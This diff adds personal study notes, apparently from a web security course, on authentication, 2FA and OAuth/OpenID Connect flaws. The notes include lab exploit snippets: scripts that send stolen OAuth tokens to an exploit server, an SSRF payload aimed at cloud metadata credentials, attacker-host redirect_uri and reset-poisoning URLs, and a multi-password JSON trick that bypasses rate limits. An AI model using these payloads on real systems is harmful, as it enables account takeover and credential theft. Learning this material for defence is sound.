@@ -1,0 +1,488 @@
+Authentication Vulnerabilities
+=============================
+
+Authentication vulnerabilities can allow attackers to gain access to sensitive data and functionality. They also expose additional attack surface for further exploits.
+
+What is Authentication?
+----------------------
+
+Authentication is the process of verifying the identity of a user or client. Websites are potentially exposed to anyone who is connected to the internet.
+There are three main types of authentication:
+- Something we know (passwords or answers of security questions)
+- Something we have (physical objects like mobile phones or security tokens)
+- Something we are or do (biometrics or patterns of behaviour)
+
+What is the difference between authentication and authorization?
+Authentication is the process of verifying that a user is who they claim to be. Authentication determines whether someone attempting to access a website with the username Carlos123 is really the same person who created the account. Once Carlos123 is authenticated, their permissions determine what they are authorized to do.
+
+How do Authentication Vulnerabilities Arise?
+-------------------------------------------
+
+Most vulnerabilities occur in one of two ways:
+- The authentication mechanisms are weak because they fail to adequately protect against brute-force attacks.
+- Logic flaws or poor coding in the implementation allow the authentication mechanisms to be bypassed entirely by an attacker. This is sometimes called "broken authentication".
+
+Vulnerabilities in Authentication Mechanisms
+-------------------------------------------
+
+A website's authentication system usually consists of severla distince mechanisms where vulnerabilities may occur. Some vulnerabilities are applicable across all of these contexts. Others are more specific to the functionality provided.
+
+
+Vulnerabilities in Password-Based Login
+======================================
+
+Brute-Force Attacks
+------------------
+
+A brute-force attack is when an attacker uses a system of trial and error to guess valid user credentials. These attacks are typically automated using wordlists of usernames and passwords.
+
+Brute-Forcing Usernames:
+Guess using recognizable patterns such as email addresses (firstname.lastname@somecompany.com is very common in business logins). admin or administrator are also some obvious patterns in high-privileged accounts. Also check publicly listed usernames during auditing.
+
+Brute-Forcing Passwords:
+Websites adopt some form of password policy, which forces users to create high-entropy passwords that are, theoretically at least, harder to crack using brute-force alone. But, rather than creating a strong password with random combinations of characters, users often take a password that they can remembmer and try to edit that into fitting the password policy, for example password can by used as password1! or p4$$w0rd, and in cases where regular changing of password is required, users may make minor changes like password1! to password1? or password2!.
+
+Username Enumeration:
+Username enumeration is when an attacker is able to observe changes in the website's behaviour in order to identify whether a given username is valid. Typically occurs on either the login page or on registration forms where we enter a username that is already taken.
+During brute-forcing, we should pay particular attention to any differences in:
+- Status codes: HTTP status code is likely to be same for a majority of guesses, but hits might get a different status code.
+- Error messages: username AND password are incorrect, username is correct but password is incorrect.
+- Response times: most checks might take similar time, but if the username is correct, the website might take longer to check if the password is correct.
+
+Flawed Brute-Force Protection
+----------------------------
+
+Two most common ways of preventing brute-force attacks are:
+- Locking the account that the remote user is trying to access if they make too many failed login attempts
+- Blocking the remote user's IP address if they make too many login attempts in quick succession
+Both approaches offer varying degrees of protection, but neither is invulnerable, especially if implemented using flawed logic.
+For example, ew might sometimes find that our IP is blocked if we fail to login too many times. In some implementations, the counter for the number of failed attempts resets if the IP owner logs in successfully. This means the attacker would simply have to log in to their own account every few attempts to prevent this limit from ever being reached.
+
+Account Locking
+--------------
+One way in which websites try to prevent brute-forcing is to lock the account if certain suspicious criteria are met, usually a set of number of failed login attempts.
+This approach fails when an attacker is just trying to gain access to any random account they can.
+The following method (an example) can be used ot work around this kind of protection:
+1. Establish a list of candidate usernames that are likely to be valid. This could be through username enumeration or simply based on a list of common usernames.
+2. Decide on a very small shortlist of passwords that we think is likely at least one user is likely to have. Crucially, the number of passwords we select must not exceed the number of login attempts allowed.
+3. Using a tool, try each of the selected passwords with each of the candidate uesrnames.
+Account locking also fails to protect against credential stuffing attacks (massive directories containing username:password pairs which are genuine login credentials stolen in data breaches.
+This lab was too tiring, wasn't able to do it bcz my requests took too long, idk why.
+
+User Rate Limiting
+-----------------
+Making too many login requests within a short period of time causes our IP address to be blocked.
+Typically, the IP can onlyl be unblocked in one of teh following ways:
+- Automatically after a certain period of time has elapsed
+- Manually by an administrator
+- Manually by the user after successfully completing a CAPTCHA
+As the limit is based on the rate of HTTP requests sent from the user's IP address, it is sometimes also possible ot bypass this defense if we can work out how to guess multiple passwords with a single request.
+
+Bypassing this can also be done by using multi-credential requests. Some login endpoints rate-limit by number of requests, not number of credentials tried. If the backend accepts a JSON array for the password field (e.g. {"username":"carlos","password":["pass1","pass2",...]}), you can smuggle dozens of guesses into a single request and bypass lockout/throttling entirely, since it only counts as one attempt.
+Change the Content-Type to application/json first.
+
+HTTP Basic Authentication
+------------------------
+
+The client receives an authentication token from the server, which is constructed by concatenating the username and password, and encoding it in Base64. This token is stored and managed by the browser, which automatically adds it ot the Authorization header of every subsequent request:
+Authorization: Basic base64(username:password)
+HTTP basic authentication is also particularly bulnerable to session-related exploits, notably CSRF, against which it offers no protection on its own.
+
+
+Vulnerabilities in Multi-Factor Authentication
+=============================================
+
+While an attacker can obtain a single knowlegde-based factor, such as a password, it might be tough to also obtain another factor from an out-of-band source. For this reason, two-factor authenticaiton is demonstrably more secure tahn single-factor authentication.
+
+Two-Factor Authentication Tokens
+-------------------------------
+
+Verification codes are usually read by the user from a physical device. Many high-security websites nwo provide users with a dedicated device for this purpose, such as the RSA token or keypad device that we might use to access our online baking or work laptop. A dedicated mobile app, such as Google Authenticator, may also be used for the same reason.
+On the other hand, some websites send verification codes to a user's mobile phone as a text message. While this is technically still verifying the factor of "something you have", it is open to abuse. Firstly, the code is being sent via SMS rather than being generated by the device itself, this creates the potential for the code to be intercepted. There is alos a risk of SIM swapping, wherevy an attacker fraudulently obtains a SIM card with the victim's phone number.
+
+Bypassing Two-Factor Authentication
+----------------------------------
+
+At times, the implementation of two-factor authentication is flawed to the point where it can be bypassed entirely.
+
+If the user is first prompted to enter a password, and then prompted to enter a verification code on a seperate page, the user is effectively in a "logged in" state before they have even entered the verification code. In this case, it is worth testing to see if we can directly skip to "logged-in only" pages after completing the first authentication step.
+
+Flawed Two-Factor Verification Logic
+-----------------------------------
+
+Sometimes flawed logic in two-factor authentication means that after a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.
+For example, the user logs in wiht their normal credentials in the first step. They are then assigned a cookie that relates to their account, before being taken to the second step of the login process. When submitting the verification code, the request uses this cookie to determine which account the user is trying to access.
+In this case, an attacker could login with their own credentials and then change the value of account cookie to any arbitrary username when submitting the verification code.
+Lab skipped, same reason as the previous one i skipped.
+
+Brute-Forcing 2FA Verification Codes
+-----------------------------------
+
+As most verification codes are often a simple 4 or 6-digit number, without adequate brute-force protection, cracking such a code is trivial.
+Some websites attempt to prevent this by automatically logging a suer out if they enter a certain number of incorrect verification codes. This is ineffective in practice because an advanced attacker can even automate this multi-step process by creating macros for Burp Intruder (Turbo Intruder extension can also be used for this purpose).
+Skipping this lab too.
+
+
+Vulnerabilities in other Authentication Mechanisms
+=================================================
+
+Keeping Users Logged In
+----------------------
+
+A common feature is the option to stay logged in even after closing a browser session. This usually is a simple checkbox labeled something like "Remember me" or "Keep me logged in".
+This functionality is often implemented by generating a "remember me" token of some kind, which is then stored in a persistent cookie. Possessing this cookie effectively allows us to bypass the entire login process, and thus it is best practice for this cookie to be impractical to guess. However, some websites generate this cookie based on a predictable concatenation of static values, such as the username and a timestamp. Some even use the password as a parto of the cookie. This approach is particularly dangerous if an attacker is able to create their own account as they can study their own cookie and potentially deduce how it is generated. Once the formula is worked out, brute-forcing other users' cookies can be done to gain access to their accounts.
+Some websites assume that if the cookie is encrypted in some way, it will nto be guessable even if it does use statice values. While this may be true if done correctly, naively "encrypting" the cookie suing a simple two-way encoding like Base64 offers no protection whatsoever. Even using a proper one-way hash function is not completely bulletproof. If the attacker is able to easily identify the hashing algorithm, and no salt is used, they can potentially brute-force the cookie by simply hashing their wordlists.
+Even if the attacker is not able to create their own account, they may still be able to exploit this vulnerability. Using the usual techniques, such as XSS, an attacker could steal another user's "remember me" cookie and deduce how the cookie is constructed from that. If that website was built using an open-source framework, the key details of the cookie construction may even be publicly documented.
+In some rare cases, it may be possible to obtain a user's actual password in cleartext from a cookie, even if it is hashed. Hashed versions of well-known password lists are available online, so if the user's password appears in one of these lists, decrypting the hash can occasionallly be as trivial as jsut pasting the hash into a search engine.
+Good Lab, had XSS injection in the comment section of a blog post, the request was mde to our exploit server which captured the cookie the request came from, also contained the stay-logged-in cookie field.
+
+Resetting User Passwords
+-----------------------
+
+In practice, some users will forget their password, so it is common to have a way for them to reset it. As the usual password-based authentication is obviously impossible in this scenario, websites have to rely on alternative methods to make sure that the real user is resetting their own password. For this reason, the password reset functionality is inherently dangerous and needs to be implemented securely.
+
+Sending Passwords by Email:
+Sending users their current passwords should never be possible if a website handles passwords securely in the first place. Instead some websites generate a new password and send this to the user via email. Sending persistent passwords over insecure channels is to be avoided. Email is also generally not considered secure given that inboxes are both persistent and not really designed for secure storage of confidential information.
+
+Resetting Passwords using a URL:
+A more robust method of resetting passwords is to send a unique URL to users that takes them to a password reset page. Less secure implementations of this method use a URL with easily guessable parameter to identify which account is being reset, for example: http://vulnerable-website.com/reset-password?user=victim-user
+A better implementation is the usage of a high-entropy, hard-to-guess token and create the reset URL based on that. When the user visits this URL, the system should check whether this token exists on the back-end and, if so, which user's password it is supposed to reset. This token should expire after a short period of time and be destroyed immediately after the password has been reset.
+However, some websites fail to also validte the token again when the reset form is submitted.
+If the URL in the reset email is generated dynamically, this may also be vulnerable to password reset poisoning. In this case, an attacker can potentially steal another user's token and use it to change their password.
+
+Password Reset Poisoning
+-----------------------
+
+Password reset poisoning is a technique whereby an attacker manipulates a vulnerable website into generating a password reset link pointing to a domain under their control. This behaviour can be leveraged to steal the secret tokens required to reset arbitrary users' passwords and, ulitmately, compromise their accounts.
+Normally generate URL: https://normal-website.com/reset?token=0a1b2c3d4e5f6g7h8i9j
+Poisoned URL: https://evil-user.net/reset?token=0a1b2c3d4e5f6g7h8i9j
+Can be done by intercepting the HTTP request and mofifying the Host header so that it points to the sus domain.
+
+Changing User Passwords
+----------------------
+
+Typically, changing our password involves entering our current password and then the new password twice. These pages fundamentally rely on the same process for checkign that usernames and current passwords match as a normal login page does. Therefore, these pages can be vulnerable to the same techniques.
+Password change functionality can be particularly dangerous if it allows an attacker to access it directly without being logged in as the victim user. For example, if the username is provided in a hidden field, an attacker might be able to edit this value in the request to target arbitrary users. This can be potentially exploited to enumerate usernames and brute-force passwords.
+
+
+OAuth 2.0 Authentication Vulnerabilities
+=======================================
+
+What is OAuth?
+-------------
+
+OAuth is a commonly used authorization framework that enables websites and web applications to request limited access to a user's account on another application. Crucially, OAuth allows the user to grant this access without exposing their login credentials to the requesting application.
+The basic OAuth process is widely used to integrate third-party functionality that requires access to certain data from a user's account. The same mechanism is also used to provide third-party authentication services, allowing users to log in with an account that they have with a different website.
+
+How OAuth 2.0 Works
+------------------
+
+It works by defining a series of interaction between three distince parties:
+- Client application: the website or web application that wants to access the user''s data
+- Resource owner: the user whose data the client application wants to access
+- OAuth service provider: the website or application that controls the user's data and access to it. They support OAuth by providing an API for interacting with both an authorization server and the resource server.
+There are numerous different ways that the actual OAuth process can be implemented. These are known as OAuth "flows" or "grant types".
+
+OAuth Grant Types
+----------------
+
+The OAuth grant type determines the exact sequence of steps that are involved in the OAuth process. The grant type also affects how the client application communicates with the OAuth service at each stage, including how the access token itself is sent.
+
+OAuth Scopes:
+For any OAuth grant type, the client application has to specify which data it wants to access and what kind of operations it wants ot perform. It does this using the scope parameter of the authorization request it sends to the OAuth service.
+For basic OAuth, the scopes for which a client application can request access are unique to each OAuth service. As the name of the scope is just an arbitrary text string, the format can vary dramatically between providers. Some even use a full URI as the scope name, similar to a REST API endpoint.
+
+Authorization Code Grant Type:
+The client application and OAuth service first use redirects to exchange a series of browser-based HTTP requests that initiate the flow. The user is asked whether they consent to the requested access. If they accept, that clinet application is granted an "authorization code". The client application then exchanges this code with the OAuth service to receive an "access token", which they can use to make API calls to fetch teh relevant user data.
+All communication that takes place from the code/token exchange onward is sent server-to-server over a secure, preconfigured back-channel and is, therefore, invisible to the end user. This secure channel is established when the client application first registers with the OAuth service. At this time, a client_secret is also generated, which the client application must use to authenticate itself when sending these server-to-server requests.
+
+Steps:
+1. Authorization Request:
+The client application sends a request to the OAuth service's /authorization endpoint asking for permission to access specific user data.
+The endpoint mapping may vary between providers.
+The request contians the following parameters, usually provided in the query string:
+- client_id: mandatory parameter containing the unique identifier of the client applicaiotn.
+- redirect_uri: the URI to which the user's browser should be redirected when sending the authorization code to the client application.
+- response_type: determines which kind of response the clinet application is expecting and, therefore, which flow it wants to initiate. For authorization code grant type, the value should be code.
+- scope: specify which subset of the user's data the client application wants to access.
+- state: stores a unique, unguessable value that is tied to the current session on the client application. This parameter serves as a form of CSRF token for the client application by making sure that teh request to its /callback endoint is from the same person who initiated the OAuth flow.
+- response_type: determines which kind of response the clinet application is expecting and, therefore, which flow it wants to initiate. For authorization code grant type, the value should be code.
+- scope: specify which subset of the user's data the client application wants to access.
+- state: stores a unique, unguessable value that is tied to the current session on the client application. This parameter serves as a form of CSRF token for the client application by making sure that teh request to its /callback endoint is from the same person who initiated the OAuth flow.
+
+2. User Login and Consent:
+When the authorization server receives the initial request, it will redirect the user ot a login page, where they will be prompted to login to their account with the OAuth provider. They will then be presented with a list of data that the client applicaton wants to access. The user can choose whether or not to consent to this access.
+Once the user has approved a given scope for a client application, this step will be completed automatically as long as the user still has a valid session with the OAuth service.
+
+3. Authorization Code Grant:
+If the user consents to the rquested access, their browser will be redirected to the /callback endpoint that was specified in the redirect_uri parameter of the authorization request. The resulting GET request will contain the authorization code as a query parameter. Depending on the configuration, it may also send the state parameter with the same value as in the authorization request.
+
+4. Access Token Request:
+Once the client applicaiton receives the authorization code, it needs to exchange it for an access token. To do this, it sends a server-to-server POST request to the OAuth server's /token endpoint. All communication from this point on takes a place in a secure back-channel, and, therefore, cannot usually be observed or controlled by an attacker.
+New parameters client_secret and grant_type appear.
+
+4. Access Token Grant:
+The OAuth service will validate the access token request. If everything is as expected, the server resopnds by granting the client application an access token with the requested scope.
+
+6. API Call:
+Now the client applicatoin ahs the access code, it can finally fetch the user's data from the resource server. To do this, it makes an API call to the OAuth service's /userinfo endpoint. The access token is submitted in the Authorization: Bearer header to prove that the client applicaion has permission to access this data.
+
+7. Resource Grant:
+The resource server should verify that the token is valid and that it belongs to the current client applicatio. If so, it will respond by sending the requested resource, i.e. the user's data based on the scope of the access token.
+
+Implicit Grant Type
+------------------
+
+Rather than first obtaining an autohrization code and the nexchanging it ofr an access token, the client application receirves the access token immediately after the user gives their consent (Far less secure than previous one).
+The implicit grant type is more suited to single-page appications and native desktop applications, which cannot easily store the client_secret on the back-end, and therefore, don't benefit as much from using the authorization code grant type.
+
+Steps:
+1. Authorization Request:
+Similar to the Authorization Code flow, only major difference is that the response_type parameter must be set to token.
+
+2. User Login and Consent
+
+3. Access Token Grant:
+If the user gives their consent to the requested access, this is where things start to differ. The OAuth service will redirect the user's browser to the redirect_uri specified in the authorization request. However, instead of sending a query parameter containing an authorization code, it will send the access token adn other token-specific data as a URL fragment.
+As the access token is sent in a URL fragment, it is never sent directly to the client application. Instead, the client applicaiton msut use a suitable script to extract the fragment and store it.
+
+4. API Call:
+Once the client application has successfully extracted the access token form the URL fragment, it can use it to make API calls to the OAuth service's /userinfo endpoint. Unlike in the authorization code flow, this also happens via the browser.
+
+5. Resource Grant:
+The resource server should verify that the token is valid and that it belongs to the current client application. If so, it will respond by sending the requested resource, i.e. the user's data based on the scope associated with the access token.
+The client application can finally use this data for its intended purpose. In case of OAuth authentication, it will typically be sued as an ID to grant the user an authenticated session, effectively logging them in.
+
+OAuth Authentication
+------------------
+
+The result of the OAuth authentication is something that broadly resembles SAML-based single sign-on (SSO)
+OAuth authentication is generally implemented as follows:
+1. The user chooses the option to log in with their social media account. The client application then uses hte social media site's OAuth service to request access to some data that it can use to identify teh user (email address, name, etc.)
+2. After receiving an access token, the client application requests this data from the resource server, typically from a dedicated /userinfo endpoint.
+3. Once it has received the data, the client application uses it in place of a username to log the user in. The access token that it received from the authorization server is often used instead of a traditional password.
+
+How do OAuth Authentication Vulnerabilities Arise?
+-------------------------------------------------
+
+Partly because the OAuth specification is relatively vague and flexible by design. Since there are a handful of mandatory components required for the basic functionality of each grant type, there's plenty of opportunity for bad practice to creep in.
+One of the other key issues with OAuth is the general lack of built-in security features. The security relies almost entirely on developers using the right combination of configuration options and implementing their own additional security measures on top, such as robust input validation.
+Depending on the grant type, highly sensitive data is also senti via the browser, which presents various opportunities for an attacker to intercept it.
+
+Identifying OAuth Authentication
+-------------------------------
+
+Login using an account from a different website -> OAuth is being used (string indication)
+The most reliable way to identify OAuth authentication is to proxy our traffic through Burp and check the corresponding HTTP messages when we use this login option. Regardless of which OAuth grant type is being used, the first request of the flow will always be a request to the /authorization endpoint containing a number of query parameters that are used specifically for OAuth. client_id, redirect_uri, and reponse_type parameters are the ones we should look out for.
+
+Recon
+----
+
+If an external OAuth service is used, we should be able to idnetify the specific provider from the hostname to which the authorization request is sent. As these services provide a public API, there is often detailed documentation available that should tell us all kinds of useful information, such as teh exact names of the endpoints and which configuration options are being used.
+Once we know the hostname of the authorization server, we should always try sending a GET request to the following standard endpoints:
+- /.well-known/oauth-authorization-server
+- /.well-known/openid-configuration
+These often return a JSON configuration file containing key inforamtion, such as details of additional features that may be supported. This will sometimes tip us off about a wider attack surface and supported features that may not be mentioned in the documentation.
+
+
+Exploiting OAuth Authentication
+==============================
+
+Vulnerabilities in the OAuth Client Application
+----------------------------------------------
+
+Client applications will often use a reputable, battle-hardened OAuth service that is well protected against widely known exploits. However, their own side of the implementation may be less secure.
+
+Improper Implementation of the Implicit Grant Type
+-------------------------------------------------
+Due to the dangers introduced by sending access tokens via the browser, the implicit grant type is mainly recommended for single-page applications. However, it is also often used in classic client-server web applications because of its relative simplicity.
+In this flow, the access token is sent from the OAuth service to the client application via the user's browser as a URL fragment. The client application then accessses the token using JS. The trouble is, if the application wants to maintain the session after the user closes the page, it needs to store teh current user data (normally a user ID and the access token) somewhere.
+To solve this problem, the client application will often submit this data to the server in a POST request and then assign the user a session cookie, effectively logging them in. This request is roughly equivalent to the form submission request that might be sent as part of a classic, password-based login. However, in this scenario, the server does not have any secrets or passwords to compare with the submitted data, which means that it is implicitly trusted. So, an attacker can simply change the parameters sent tothe server to impersonate any user.
+
+Flawed CSRF Protection
+---------------------
+Although many components of the OAuth flows are optional, some of them are strongly recommended unnless there's an important reason not to use them. One such example is the state parameter.
+The state parameter should ideally contain an unguessable value, such as the hash of something tied to the user's session when it first initiates the OAuth flow. This value is then passed back and forth between the client and the OAuth service as a form of CSRF token for the client application. Therefore, if we notice that the authorization request does not send a state parameter, this is extremely interesting from an attacker's perspective. It potentially means that they can initiate an OAuth flow themselves before tricking a user's browser into completing it, similar to a traditional CSRF attack.
+
+Leaking Authorization Codes and Access Tokens
+--------------------------------------------
+
+Depending on the grant type, either a code or token is sent via the victim's browser to the /callback endpoint specified in the redirect_uri parameter of the authorization request. If the OAuth service fails to validate this URI properly, an attacker may be able to construct a CSRF-like attack, tricking the victims browser into initiating an OAuth flow that will send the code or token to an attacker-controlled redirect_uri.
+In the case of the authorization code flow, an attacker can potentially steal the victim's code before it is used. They can then send this code to the client application's legitimate /callback endpoint (the original redirect_uri) to get access to the user's account. In this scenario, an attacker does not even need to know the client secret or the resulting access token. As long as the victim has a valid session with the OAuth service, the client application will simply complete the code/token exchange on the attacker's behalf before logging them in to the victim's account.
+More secure authorization servers will require a redirect_uri parameter to be sent when exchangning the code as well. The server can then check whether this matches the one it received in the initial authorization request and reject the exchange if not. As this happens in server-to-server requests via a secure back-channel, the attacker is not able to control this second redirect_uri parameter.
+CSRF should be done before attempting these labs, use the same attack pattern as in CSRF.
+
+Flawed redirect_uri Validation
+-----------------------------
+It is best practice for client applications to provide a whitelist of their genuine callback URIs when registering with the OAuth service. This way, when the OAuth service receives a new request, it can validate the redirect_uri parameter against this whitelist. In this case, supplying an external URI will likely result in an error.
+When auditing an OAuth flow, we should try experimenting with the redirect_uri parameter ot understand how it is being validated. For example:
+- Some implementations allow for a range of subdirectories by checking only that the string starts with the correct sequence of characters, i.e. an approved domain. We should try removing or adding arbitrary paths, query parameters, and fragments to see what we can change without triggering an error.
+- If we can append extra values to the default redirect_uri param, we might be able to exploit discrepancies between the parsing of the URI by the different componenets of the OAuth sevice. (Recommended to check out SSRF defences and CORS)
+- We may also occasionally come across server-side parameter pollution vulnerabilities. Just in case, we should try submitting duplicate redirect_uri parameters: https://oauth-authorization-server.com/?client_id=123&redirect_uri=client-app.com/callback&redirect_uri=evil-user.net
+- Some servers also give special treatment ot localhost URIs as they're often used during development. In some cases, any redirect URI beginning with localhost may be accidentally permitted in the production environment. This could allow us to bypass the validation by registering a domain name such as localhost.evil-user.net.
+We shouldn't limit our testing to just probing the redirect_uri parameter in isolation, we should also try to experiment with different combinations of changes. Sometimes, changing one parameter can affect the validation of others.
+
+Stealing Codes and Access Tokens via a Proxy Page
+------------------------------------------------
+Against more robust targets, we might find that no matter what we try, we are unable to successfully submit an external domain as the redirect_uri. In this case, we should try to find if we can successfully access different subdomains or paths, like using directory traversal tricks to supply any arbitrary path on the domain.
+Once we identify which other pages we are able to set as the redirect URI, we should audit them for additional vulnerabilities that we can potentially use to leak the code or token. For the authorization code flow, we need to find a vulnerability that gives us access to the query parameters, whereas for the implicit grant type, we need to extract the URL fragment.
+One of the most useful vulnerabilities for this purpose is an open redirect. We can use this as a proxy to forward victims, along with their code or token, to an attacker-controlled domain where we can host any malicious script we like.
+For the implicit grant type, stealing an access token doesn't just enable us to log in to the victim's account on the client application. As the entire implicit flow takes place via the browser, we can also use the token to make our own API calls to the OAuth service's resource server. This may enable us to fetch sensitive user data that we cannot normally access from the client application's web UI.
+lab steps (i will forget, ik):
+- redirect_uri is vulnerable to directory traversal (/oauth-callback/../post?postId=1)
+- hint: check the next button at the end of the post, craft url that may lead to exploit server (next redirect does not get checked)
+- craft an exploit that sends this url to the victim, and forces the victim to visit our malicious URL:
+<script>
+  if (!document.location.hash) {
+    window.location = 'exploit-url'
+  }
+  else {
+    window.location = '/?' + document.location.hash.substr(1)
+  }
+</script>
+- use the /me in the oauth page, replace Bearer token with the received token in the logs.
+
+In addition to open redirects, we should look for any other vulnerabilities that allow us to extract the code or token and send it to an external domain:
+- dangerous JS that handles query parameters and URL fragments (insecure web messaging scripts, etc)
+- XSS vulnerabilities
+- HTML injection vulnerabilities
+
+lab: inspect the comment comment-form in burp.
+in exploit server:
+<iframe src="https://oauth-0aad00670468b40380b5dd8b02c70039.oauth-server.net/auth?client_id=z35wlg2fmfmbuetcfvk9y&redirect_uri=https://0a0700110447b4aa8086df25007d00bb.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1552239120&scope=openid%20profile%20email"></iframe>
+<script>
+    window.addEventListener('message', function(e) {
+        fetch("/" + encodeURIComponent(e.data.data))
+    }, false)
+</script>
+- understand how the exploit works (pretty good lab, needed to view soln)
+
+Flawed Scope Validation
+----------------------
+
+In any OAuth flow, the user must approve the requsted access based on the scope defined in the authorization request. The resulting token allows the client application to access only the scope that was approved by the user. But in some cases, it may be possible for an attacker to "upgrade" an access token (either stolen or obtained using a malicious client application) with extra permissions due to flawed validation by the OAuth service. The process for doing this depends on the grant type.
+
+Scope upgrade: authorization code flow
+-------------------------------------
+With the authorization code grant type, the user's data is requested and sent via secure server-to-server communication, which a third-party attacker is typically not able to manipulate directly, however, it may still be possible to achieve the same result by registering their own client application with the OAuth service.
+For example, the attacker's malicious client application initially requested access to the user's email address using te openid email scope. After the user approves this request, the malicious client application receives an auth code. As the attacker controls the client application, they can add another scope parameter to the code/token exchange request containing the additional profile scope.
+POST /token
+Host: oauth-authorization-server.com
+…
+client_id=12345&client_secret=SECRET&redirect_uri=https://client-app.com/callback&grant_type=authorization_code&code=a1b2c3d4e5f6g7h8&scope=openid%20 email%20profile
+If the server doesn't validate this against the scope from teh initial auth request, it will sometimes generate an access token using teh new scope and send this to the attacker's client application
+{
+    "access_token": "z0y9x8w7v6u5",
+    "token_type": "Bearer",
+    "expires_in": 3600,
+    "scope": "openid email profile",
+    …
+}
+
+Scope upgrade: implicit flow
+---------------------------
+For the implicit grant type, the access token is sent via the browser, which means an attacker can steal tokens associated with innocent client applications and use them directly. Once they have stolen an access token, they can send a normal browser-based request to the OAuth service's /userinfo endpoint, manually adding a new scope parameter in the process.
+Ideally, the OAuth service should validate this scope value against the one that was used when generating the token, but this isn't always the case. As long as the adjusted permissions don't exceed the level of access previously granted to this client application, the attacker can potentially access additional data without requiring further approval from the user.
+
+Unverified User Registration
+---------------------------
+
+When authentication users via OAuth, the client application makes the implicit assumption that the information stored by the OAuth provider is correct. This can be a dangerous assumption to make.
+Some websites that provide an OAuth service allow users to register an account without verifygin all of their details, including their email address in some cases. An attacker can exploit this by registering an account with the OAuth provider using the same details as a target user, such as a known email address. Client applications may then allow the attacker to sign in as the victim via this fraudulent account with the OAuth provider
+
+
+OpenID Connect
+=============
+
+OpenID Connect extends the OAuth protocol to provide a dedicated identity and authentication layer that sites on top of the basic OAuth implementation. It adds some simple functionality that enables better support for the authentication use case of OAuth.
+OAuth was not initially designed with authentication in mind, it was intended to be a means of delegating authorizations for specific resources between resources. However, many websites began customizing OAuth for use as an authentication mechanism. To achieve this, they typically requested read access to some basic user data and, if they were granted this access, assumed that the user authenticated themselves on the side of the OAuth provider.
+OAuth authentication mechanisms were far from ideal. For a start, client applications had no way of knowing when, where, or how the user was authenticated. As each of these implementations was a custom workaround of sorts, there was also no standard way of requesting user data for this purpose. To support OAuth properly, client applications would have to configure seperaet OAuth mechanisms for each provider, each with different endpoints, unique sets of scopes, and so on.
+
+How OpenID Connect Works
+-----------------------
+
+From the client application's perspective, the key difference is that there is an additional, standardized set of scopes that are the same for all providers, and an extra response type: id_token.
+
+OpenID Connect roles:
+- Relying Party: the application that is requesting authenticatio of a user, synonymous with the OAuth client application
+- End User: the user who is being authenticated, synonymous with the OAuth resource owner
+- OpenID Provider: an OAuth service that is configgured to support OpenID Connect
+
+OpenID Connect Claims and Scopes
+-------------------------------
+The term "claims" refers to the key:value pairs that represent information about the user on the resource server.
+Unlike basic OAuth, whose scopes are unique to each provider, all OpenID Connect services use an identical set of scopes. In order to use OpenID Connect, the client application must specify the scope openid in the authorization request. They can include one or more of the other standard scopes:
+- profile
+- email
+- address
+- phone
+Each of these scopes corresponds to read access for a subset of claims about the user that are defined in the OpenID specification.
+
+ID token
+-------
+The other main addition provided by OpenID Connect is the id_token reponse type. This returns a JSON web token (JWT) signed with a JSON web signature (JWS). The JWT payload contains a list of claims based on the scope that was initially requested. It also contains information about how and when the user was last authenticated by the OAuth service. The client application can use this to decide whether or not the user has been sufficiently authenticated.
+Min benefit of using id_token is to reduce the number of requests sent between the client application and the OAuth service, which could provide better performance overall. Instead of having to get an access token and then request the user data seperately, the ID token containing this data is sent to the client application immediately after the user has authenticated themselves.
+The integrity of the data transmitted in an ID token is based on a JWT cryptographic signature. For this reason, the use of ID tokens may help protect against some man-in-the-middle attacks. However, given that the cryptographic keys for signature verification are transmitted over the same network channel (normally exposed on /.well-known/jwks.json), some attacks are still possible.
+Multiple response types are supported by OAuth, so it is perfectly acceptable for a client application to send an authorization request with both a basic OAuth response type and OpenID Connect's id_token response type.
+
+Identifying OpenID Connect
+-------------------------
+
+Most foolproof way is to look for the mandatory openid scope. Even if the login process does not initially appear to be using OpenID Connect, it is still worth checking whether the OAuth service supports it. We can simply try adding the openid scope or change the response type to id_token and observign whether this results in an error.
+It is also a good idea to take a look at the OAuth provider's documentation to see if there's any userful information about their OpenID Connect support. We may also be able to access the configuration file from the standard endponit /.well-knwon/openid-configuration.
+
+OpenID Connect Vulnerabilities
+-----------------------------
+
+The specification for OpenID Connect is much stricter than that of basic OAuth, which means there's generally less potential for quirky implementation with glaring vulnerabilities.
+As OpenID Connect is just a layer that sits on top of OAuth, the client application or OAuth service may still be vulnerable to some of the OAuth-based attacks we looked at earlier.
+
+Unprotected dynamic client registration
+--------------------------------------
+The OpenID specification outlines a standardized way of allowing client application to register with the OpenID provider. If dynamic client registration is supported, the client application can register itself by sending a POST request to a dedicated /registration endpoint. The name of this endpoint is usually provided in the configuration file and documentation.
+In the request body, the client application submits key information about itself in JSON format. For example, it will often be required to include an array of whitelisted redirect URIs. It can also submit a range of additional information, such as the names of the endpoints they want to expose, a name for their application, and so on.
+Typical registration request:
+POST /openid/register HTTP/1.1
+Content-Type: application/json
+Accept: application/json
+Host: oauth-authorization-server.com
+Authorization: Bearer ab12cd34ef56gh89
+
+{
+    "application_type": "web",
+    "redirect_uris": [
+        "https://client-app.com/callback",
+        "https://client-app.com/callback2"
+        ],
+    "client_name": "My Application",
+    "logo_uri": "https://client-app.com/logo.png",
+    "token_endpoint_auth_method": "client_secret_basic",
+    "jwks_uri": "https://client-app.com/my_public_keys.jwks",
+    "userinfo_encrypted_response_alg": "RSA1_5",
+    "userinfo_encrypted_response_enc": "A128CBC-HS256",
+    …
+}
+The OpenID provider should require the client application to authenticate itself. In the example above, there is and HTTP bearer token being used. However, some providers will allow dynamic client registration without any authentication, which enables an attacker to register their own malicious client application. This can have various consequences depending on how the values of these attacker-controllable properties are used.
+Pretty good lab here
+- check for /.well-known/openid-configuration in the oauth website, will open a list of the wehitelisted websites
+- we find that we can access the /reg (POST) to inject a custom redirect_uri whitelist, check that
+- now, during the login phase in the oauth server, the logo appears, its address is /client/CLIENT-ID/logo, we can use this logo to inject the url of the given website (/admin one)
+- send a GET request (the same POST request as in the /reg one), add "logo_uri" : "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/" to the next line of the redirect_uri array.
+- sending this request fetches the client id of the /admin, use this secret to fetch the /client/CLIENT-ID/logo, which then gives us the client secret.
+
+Allowing authorization requests by reference
+-------------------------------------------
